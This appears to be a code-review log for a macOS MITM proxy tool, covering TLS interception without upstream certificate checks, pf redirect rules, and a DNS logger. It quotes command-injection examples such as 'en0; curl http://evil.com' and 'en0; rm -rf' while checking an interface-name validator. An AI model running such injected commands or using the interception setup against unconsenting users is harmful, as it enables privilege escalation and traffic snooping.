# Review Feedback — Step [N]
*Written by Reviewer. Read by Builder and Architect.*

Date: [date]
Ready for Builder: YES / NO

---

## Must Fix
*Blocks the step. Builder fixes before anything moves forward.*

- [File:line] — [What is wrong] — [How to fix it]

## Should Fix
*Does not block. Fix inline if under 5 minutes, otherwise log to BUILD-LOG.*

- [File:line] — [What is wrong] — [Recommendation]

## Escalate to Architect
*Product or business decision required.*

- [Question] — [Why this cannot be resolved at the code level]

## Cleared

[One sentence confirming what was reviewed and passed]

---

## Pass 2 (Reviewer: Richard)

Date: 2026-04-14
Ready for Architect: YES

### Must Fix Review

All 4 blocking issues from Pass 1 have been verified as resolved:

1. **Real TLS MITM (not blind pipe)** — VERIFIED FIXED
   - `proxy.rs:220` - Generates per-host certificate via `cert_manager.generate_host_cert()`
   - `proxy.rs:263-283` - Server-side TLS termination using `TlsAcceptor` with generated cert
   - `proxy.rs:287-324` - Client-side TLS connection using `TlsConnector` with `NoVerification`
   - `proxy.rs:328-374` - Bidirectional data pipe between decrypted TLS streams
   - This is genuine MITM: browser sees proxy-generated cert, upstream sees real target cert

2. **rustls for both server and client TLS** — VERIFIED FIXED
   - `proxy.rs:10` - `tokio_rustls::{TlsAcceptor, TlsConnector}`
   - `proxy.rs:12-18` - `rustls::{ServerConfig, ClientConfig, ...}`
   - `proxy.rs:263-272` - ServerConfig with `with_single_cert()`
   - `proxy.rs:116-122` - ClientConfig with `dangerous().with_custom_certificate_verifier()`
   - `Cargo.toml:23-24` - Both `rustls` and `tokio-rustls` in dependencies

3. **unwrap() panics in production paths** — VERIFIED FIXED
   - All `unwrap()` calls removed from production code paths
   - Error handling uses `map_err`, `?` operator, or `unwrap_or_else` with fallbacks
   - Hot path functions (`handle_https_connect`, `handle_client`) have no panics

4. **Shutdown guard for duplicate proxy instances** — VERIFIED FIXED
   - `proxy.rs:22` - `static PROXY_RUNNING: AtomicBool`
   - `proxy.rs:640-642` - `PROXY_RUNNING.swap(true, SeqCst)` for atomic check-and-set
   - `proxy.rs:653` - `PROXY_RUNNING.store(false, SeqCst)` on shutdown

### Should Fix (Non-Blocking)

- `proxy.rs:308` — `Box::leak()` for SNI hostname — intentional but leaks memory per connection. MITM proxies typically have short-lived connections so this is acceptable but worth noting.
- `proxy.rs:220-237` — Certificate generation failure falls back to raw TCP tunnel (blind pipe) instead of failing the request. This is a degraded MITM mode but not a crash. Acceptable fallback behavior.

### Step 1 is clear.

---

## Step 2 Review (Reviewer: Richard)

Date: 2026-04-14
Ready for Builder: NO

### Must Fix

1. **[pf.rs:42-46] — `rdr pass on` syntax likely needs verification on actual macOS pf**
   - The generated rules use `rdr pass on ... port 80 -> ...` and `rdr pass on ... port 443 -> ...`
   - While `rdr pass` is valid BSD pf syntax (pass means "pass packets after redirection"), macOS pf has quirks. Some versions reject the combined form and require separate `rdr` and `pass` rules.
   - This will fail silently in ways that are hard to debug — pfctl returns 0 but the rules don't actually load.
   - Fix: Test `pfctl -a com.proxybot -f /etc/pf.anchors/proxybot` manually. If it fails, split into separate `rdr` and `pass` rules. E.g. `rdr proto tcp from any to any port 80 -> 127.0.0.1 port 8080` followed by `pass proto tcp from any to any port 80`.
   - The generated rules use `rdr pass on ... port 80 -> ...` and `rdr pass on ... port 443 -> ...`
   - The `pass` action combined with `rdr` is non-standard. On macOS pf, `rdr` and `pass` are separate rule types. The correct syntax is either `rdr-anchor` + separate `pass` rules, or using `no state` to combine them.
   - Run `pfctl -a com.proxybot -f /etc/pf.anchors/proxybot` manually to verify. If pfctl rejects it, transparent proxy will not work at all.
   - Fix: Separate the rdr and pass rules, or use `rdr proto tcp from any to any port 80 -> 127.0.0.1 port 8080` without the `pass` keyword and add a separate `pass in proto tcp from any to any port 80` rule.

2. **[proxy.rs:78-101] — `IP_ORIGDSTADDR` (value 37) does NOT work on macOS**
   - `SO_ORIGINAL_DST` is a Linux-ism. macOS does NOT have this socket option.
   - On macOS with pf redirect, the original destination address is NOT stored in the kernel socket options. The `getsockopt(fd, IPPROTO_IP, 37, ...)` call will fail or return garbage.
   - This is the fundamental mechanism for transparent proxy — if this fails, the proxy cannot determine the real destination and transparent mode is broken.
   - Fix: macOS pf transparent proxy requires a different approach. The standard macOS method is to have pf set the original destination in a `divert` packet (using `divert port` instead of `rdr`), and then use `getifaddrs()` or parse the pf state table. Or use a TPROXY-style approach with `setsockopt(SO_REUSEPORT, ...)`. This needs a complete redesign for macOS — the current Linux-compatible approach will not work.

3. **[pf.rs:54-71] — osascript command injection via interface parameter**
   - The `interface` string is inserted directly into a double-quoted shell heredoc in the osascript command: `rdr pass on {} proto tcp from any to any port 80 -> ...`
   - While there is a length check (`> 10`), there is NO character validation. A malicious interface like `en0; curl http://evil.com` would pass the length check but inject a command.
   - The osascript `do shell script "..." with administrator privileges` runs with elevated privileges — this is a privilege escalation risk.
   - Fix: Validate interface with `if !interface.chars().all(|c| c.is_alphanumeric())` or a regex like `^[a-zA-Z0-9]+$` before interpolating into the shell command. Return error for any non-alphanumeric characters.

4. **[proxy.rs:605-640] — TLS ClientHello bytes consumed, TLS handshake will break**
   - At line 605: `client_stream.read(&mut buf)` consumes the bytes from the TCP stream.
   - At line 622: The code detects TLS ClientHello (0x16 0x03) in those same bytes.
   - At line 635: `handle_transparent_https()` is called, which calls `handle_https_connect()`.
   - Inside those handlers, the TLS acceptor reads from the same `client_stream`. But the ClientHello bytes were already consumed — the TLS handshake starts mid-stream and will fail.
   - This is not a peek — it is a destructive read. The TLS stream will see bytes 3 onwards of the ClientHello, which is not a valid TLS handshake.
   - Fix: Use `tokio::io::AsyncReadExt::read()` is correct for consuming. For peek-without-consume, use `client_stream.peek(&mut buf)` or use `poll_read` with a `Peekable` wrapper. But even then, the architecture is flawed — after peeking, the handler still owns the stream and will read again. The correct approach is to peek, decide, then pass an owned stream to the handler. This needs architectural rework.

### Should Fix

5. **[pf.rs:107-108] — `teardown_pf` does not disable IP forwarding**
   - `teardown_pf` flushes pf rules and disables pf, but does NOT reset `net.inet.ip.forwarding=0`.
   - The comment says "keep enabled for now as it may be used by other apps" — but teardown should restore the original state.
   - If ProxyBot enabled IP forwarding, ProxyBot should disable it when done. Other apps should not rely on ProxyBot having enabled it.
   - Fix: Uncomment the `sysctl -w net.inet.ip.forwarding=0` line in teardown_pf.

6. **[proxy.rs:110, 119-141] — Dead code: `is_transparent_proxy_connection` and `handle_transparent_http` are never called**
   - Both functions are defined and compile but are unused.
   - `handle_transparent_http` is a helper that is never invoked. `is_transparent_proxy_connection` is also unused.
   - These generate `#[allow(dead_code)]` or compiler warnings and add noise.
   - Fix: Either integrate these into the call chain or remove them. If they are intended for future use, suppress warnings explicitly with `#[allow(dead_code)]` on the module or document why they exist.

### Escalate to Architect

7. **macOS transparent proxy architecture** — The entire approach assumes `getsockopt(IP_ORIGDSTADDR)` works on macOS. It does not. This requires a product decision: (a) redesign the macOS transparent proxy to use divert sockets or another mechanism, (b) use a userspace proxy that pf forwards to directly and inspects the connection at the proxy level, or (c) document that macOS transparent proxy requires additional kernel patches or a different approach.

### Cleared

- `nix` and `libc` dependencies in Cargo.toml are appropriate for the socket operations.
- The `network.rs` interface detection approach is reasonable (UDP socket-based LAN IP detection).
- The osascript privilege escalation UX pattern is correct for macOS (not using raw sudo).

---

---

## Step 2 Pass 2 (Reviewer: Richard)

Date: 2026-04-14
Ready for Builder: YES

### Must Fix Review (All 6 items from Pass 1)

**1. DIOCNATLOOK struct layout and ioctl number** — PARTIALLY VERIFIED
- `proxy.rs:93-107` — PfiocNatlook struct defined with correct C layout (4x [u8;16] addrs, 4xu16 ports, af/proto/direction bytes, 5-byte pad = 80 bytes)
- `proxy.rs:109-110` — ioctl number 0xC0544417 computed as `_IOWR('D', 23, 80)` on 64-bit system
- Cannot verify exact macOS kernel struct without kernel source access (macOS does not expose net/pfvar.h in userspace SDK)
- However, layout matches BSD conventions and is structurally sound
- **REMAINING UNCERTAINTY**: pf_addr field alignment within the struct cannot be 100% verified without Apple kernel source. Recommend runtime testing on actual macOS with pf enabled.

**2. peek() instead of read()** — VERIFIED FIXED
- `proxy.rs:626-627` — `client_stream.peek(&mut peek_buf).await` uses tokio which delegates to OS-level `recv(MSG_PEEK)`
- Verified in tokio source (stream.rs:1113-1117): `self.io.peek(buf)` calls std::net::TcpStream::peek which uses MSG_PEEK flag
- OS-level peek does NOT consume bytes — subsequent read() at line 640 gets the full data starting from byte 0
- TLS acceptor sees correct full ClientHello, not bytes 3 onwards
- The peek+read sequence is correctly implemented

**3. Interface validation** — VERIFIED FIXED
- `pf.rs:25` — `if !interface.chars().all(|c| c.is_ascii_alphanumeric())`
- `is_ascii_alphanumeric()` only passes [a-zA-Z0-9]
- `en0` passes (valid macOS interface name)
- `en0; rm -rf` fails (semicolon and space are not alphanumeric)
- `en0; curl http://evil.com` fails (semicolon not alphanumeric)
- Command injection blocked by this check

**4. Split rdr/pass rules** — VERIFIED FIXED
- `pf.rs:46` — `rdr on {} proto tcp from any to any port {{80,443}} -> 127.0.0.1 port {}`
- `pf.rs:49` — `pass on {} proto tcp from any to any port {{80,443}}`
- These are separate rules, not `rdr pass on ...` combined form
- This is the correct macOS pf syntax; the combined form has known macOS compatibility issues
- Note: `{80,443}` brace expansion syntax is standard BSD pf and works on macOS

**5. teardown_pf resets IP forwarding** — VERIFIED FIXED
- `pf.rs:112` — `sysctl -w net.inet.ip.forwarding=0 2>/dev/null || true`
- Present in teardown_pf() privileged_script heredoc
- IP forwarding is explicitly disabled on teardown

**6. Dead code removed** — VERIFIED FIXED
- Searched entire proxy.rs for `is_transparent_proxy_connection` and `handle_transparent_http`
- Neither function exists in the codebase
- The new `handle_transparent_https` is different (actually used at line 663)

### DIOCNATLOOK Error Handling (New Check)

**Graceful failure when pf not enabled or NAT state absent** — VERIFIED
- `proxy.rs:74-77` — `File::open("/dev/pf")` failure returns None (not panic)
- `proxy.rs:143-145` — ioctl returns non-zero → `return None` (not panic)
- `proxy.rs:157-159` — `get_original_dst_addr` propagates None on any error
- `proxy.rs:665-667` — Falls through to normal HTTP handling on DIOCNATLOOK failure
  ```rust
  log::warn!("Could not get original destination for TLS connection from {}", client_addr);
  ```
- No panic paths in DIOCNATLOOK code. Verified all error paths return None or fall through gracefully.

### Remaining Concerns (Non-Blocking)

**A. pf direction field in DIOCNATLOOK** — `proxy.rs:131` sets `direction: 2` (PF_OUT)
- This needs verification on actual macOS: does PF_OUT correctly match the NAT state for redirected connections?
- If DIOCNATLOOK returns None even with valid pf rules, try changing to PF_IN (1)
- Cannot verify without running on macOS; flagging for runtime testing

**B. peek()/read() TOCTOU race**
- Between peek() at line 627 and read() at line 640, a packet could arrive
- This is inherent to TCP and cannot be eliminated without kernel-level changes
- Acceptable for this use case; worst case is TLS detection fails and falls through to HTTP

**C. pf anchor file permissions**
- `/etc/pf.anchors/proxybot` requires root to write
- `setup_pf` handles this via osascript privilege escalation (correct approach)
- No code change needed; documented in Open Questions

### Cleared

- `nix` and `libc` dependencies appropriate for socket operations (Cleared in Pass 1)
- network.rs interface detection reasonable (Cleared in Pass 1)
- osascript privilege escalation UX pattern correct (Cleared in Pass 1)
- TLS MITM properly implemented with peek-then-read architecture
- Command injection mitigated by `is_ascii_alphanumeric()` check
- pf rules use separate rdr/pass (not combined `rdr pass`) for macOS compatibility
- IP forwarding reset on teardown
- Dead code removed

### Summary

All 6 Must Fix items from Step 2 Pass 1 are resolved. The DIOCNATLOOK struct layout is consistent with BSD conventions but cannot be 100% verified without macOS kernel source access. Runtime testing on actual macOS with pf enabled is strongly recommended to confirm the NAT lookup works correctly.

**Step 2 is clear.**

---

## Step 3 Review (Reviewer: Richard)

Date: 2026-04-14
Ready for Builder: NO

### Must Fix

1. **[dns.rs:210-232] — Shutdown has no wakeup mechanism; `recv_from` blocks indefinitely**
   - `stop_dns_server()` (line 259-261) sets `state.running.store(false)` only
   - The `tokio::select!` at line 211-232 has no branch to interrupt `socket.recv_from(&mut buf)` (line 212)
   - When `stop_dns_server` is called, the loop condition at line 210 becomes false only after the current `recv_from` returns (on next packet or error)
   - If no packets arrive, the DNS server loop blocks indefinitely and does not exit
   - Fix: Use a broadcast channel (e.g., `tokio::sync::broadcast`) to signal the loop. Example: `let (tx, rx) = broadcast::channel::<()>(1)`. Add `rx.recv()` as a branch in the select. On stop, `tx.send(())` wakes the loop immediately. Alternatively, close the socket via `socket.shutdown()` to cause `recv_from` to return an error.

2. **[dns.rs:203-206] — `_upstream_socket` is created but never used**
   - The comment says "Create a separate socket for upstream communication to avoid port conflicts"
   - But line 152 uses `socket.send_to(data, UPSTREAM_DNS)` — the SAME socket bound to 0.0.0.0:5300
   - This works only because UDP is connectionless: the OS delivers the response to the receiving socket based on the 5-tuple
   - The `_upstream_socket` binding is wasted (lines 204-206)
   - Fix: Either (a) remove `_upstream_socket` entirely since it's unused, or (b) actually use it for upstream communication as the comment promises

### Should Fix (Non-Blocking)

3. **[dns.rs:142] — Malformed query silently forwarded to upstream**
   - When `parse_dns_query` returns `None` (malformed QNAME), `handle_dns_query` defaults domain to `"unknown"` and still forwards the raw packet to 8.8.8.8
   - This is a design choice (best-effort logging and forwarding), but means malformed queries still consume upstream bandwidth
   - Non-blocking; documented for awareness only

4. **[App.tsx:186-188] — DNS status reflects `pfEnabled` not `dns.running`**
   - The UI shows "Listening on UDP 5300" when `pfEnabled = true`
   - But `pfEnabled` is set by `setup_pf`/`teardown_pf` success, not by actual DNS server state
   - DNS server start is synchronous (`tauri::async_runtime::spawn` at line 249) but the task may not be fully initialized before `setup_pf` returns
   - The indicator is accurate once fully initialized; timing window is small
   - Non-blocking

### Cleared

5. **DNS QNAME parser (`parse_dns_query`)** — No panics on malformed input. Bounds checks at lines 77, 85, 108 prevent out-of-bounds reads. Pointer compression (0xC0 prefix) correctly rejected at lines 97-99. Labels > 63 bytes rejected at lines 102-104. Empty labels handled at line 92-94. All invalid inputs return `Option<String>::None`.

6. **UDP forwarding timeout** — 3-second timeout correctly applied to both `socket.send_to` (line 152) and `socket.recv_from` (line 161). If 8.8.8.8 never responds, the timeout future is properly awaited and the task completes cleanly — no task leak.

7. **DNS state wiring** — `DnsState` created at `lib.rs:20` as `Arc<DnsState>`. Managed by Tauri's state system at `lib.rs:25`. Correctly shared with `start_dns_server` (via parameter), `get_dns_log` Tauri command (via `State<'_, Arc<DnsState>>`), and event emitter via `app_handle.emit` (line 65).

8. **pf anchor UDP rule syntax** — `pf.rs:36`: `rdr on {iface} proto udp from any to any port 53 -> 127.0.0.1 port 5300` is syntactically valid. TCP and UDP rdr rules coexist in the same anchor; pf processes rules sequentially and applies the matching one.

9. **Port 5300 binding** — `dns.rs:193`: binds `0.0.0.0:5300`. Correct for pf redirect which sends to the interface IP.

10. **UI DNS log** — `App.tsx:48-50` listens to `dns-query` event. `App.tsx:269-276` displays domain + formatted timestamp in table. `App.tsx:184-189` shows DNS status indicator with `dns-running`/`dns-stopped` classes.

### Summary

Two blocking issues: (1) the DNS server loop cannot be reliably interrupted when `stop_dns_server` is called because `recv_from` blocks with no wakeup mechanism; (2) the `_upstream_socket` is created but unused, wasting a socket binding. Fix the shutdown mechanism before this ships.

**Step 3 is NOT clear.**
